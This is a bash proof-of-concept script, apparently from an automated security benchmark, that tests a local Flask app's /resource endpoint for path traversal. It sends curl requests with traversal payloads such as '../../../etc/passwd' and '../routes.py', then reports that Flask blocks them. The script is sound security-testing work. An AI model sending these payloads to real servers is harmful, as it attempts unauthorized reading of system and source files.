#!/bin/bash
# POC: Demonstrates path traversal vulnerability in /resource endpoint. Shows that the application accepts user-controlled filename parameter and passes it to send_from_directory without proper validation, though Flask's runtime protections currently prevent exploitation.
# Target: ./repo
# Created: 2025-11-04T19:24:56.682Z
# Session: benchmark-XBEN-019-24-mhkyd1c6

# Path Traversal Vulnerability POC - /resource endpoint
# Demonstrates unsanitized filename parameter vulnerability

TARGET_URL="${1:-http://localhost:5000}"
echo "[*] Testing Path Traversal Vulnerability in /resource endpoint"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Direct file access (should work - accessing flag file)
echo "[TEST 1] Direct file access - /resource?filename=flag"
response=$(curl -s -w "\n%{http_code}" "$TARGET_URL/resource?filename=flag")
http_code=$(echo "$response" | tail -n1)
body=$(echo "$response" | sed '$d')
echo "HTTP Status: $http_code"
if [ "$http_code" = "200" ]; then
    echo "Response Body: $body"
    echo "✓ File access successful - vulnerability confirmed (direct access works)"
else
    echo "Response Body: $body"
    echo "✗ Unexpected response"
fi
echo ""

# Test 2: Path traversal attempt - accessing routes.py
echo "[TEST 2] Path traversal attempt - /resource?filename=../routes.py"
response=$(curl -s -w "\n%{http_code}" "$TARGET_URL/resource?filename=../routes.py")
http_code=$(echo "$response" | tail -n1)
body=$(echo "$response" | sed '$d')
echo "HTTP Status: $http_code"
if [ "$http_code" = "404" ]; then
    echo "✓ Flask protection blocked traversal (good, but code is still vulnerable)"
elif [ "$http_code" = "200" ]; then
    echo "Response Body: $body"
    echo "✗ CRITICAL: Path traversal succeeded!"
else
    echo "Response: $body"
fi
echo ""

# Test 3: Path traversal attempt - accessing /etc/passwd
echo "[TEST 3] Path traversal attempt - /resource?filename=../../../etc/passwd"
response=$(curl -s -w "\n%{http_code}" "$TARGET_URL/resource?filename=../../../etc/passwd")
http_code=$(echo "$response" | tail -n1)
body=$(echo "$response" | sed '$d')
echo "HTTP Status: $http_code"
if [ "$http_code" = "404" ]; then
    echo "✓ Flask protection blocked traversal (good, but code is still vulnerable)"
elif [ "$http_code" = "200" ]; then
    echo "Response Body: $body"
    echo "✗ CRITICAL: System file access succeeded!"
else
    echo "Response: $body"
fi
echo ""

# Test 4: Subdirectory access within static
echo "[TEST 4] Subdirectory access - /resource?filename=css/style.css"
response=$(curl -s -w "\n%{http_code}" "$TARGET_URL/resource?filename=css/style.css")
http_code=$(echo "$response" | tail -n1)
body=$(echo "$response" | sed '$d')
echo "HTTP Status: $http_code"
if [ "$http_code" = "200" ]; then
    echo "✓ Subdirectory file access works (as expected for valid files)"
else
    echo "Response: $body"
fi
echo ""

# Summary
echo "[*] VULNERABILITY ANALYSIS:"
echo "The application passes user-controlled 'filename' parameter directly to Flask's"
echo "send_from_directory() without validation. While Flask's runtime protections"
echo "currently prevent exploitation, this is an insecure coding pattern."
echo ""
echo "Risk: If Flask protections are removed or bypassed, arbitrary file access is possible."
echo "Recommendation: Implement server-side filename validation and whitelisting."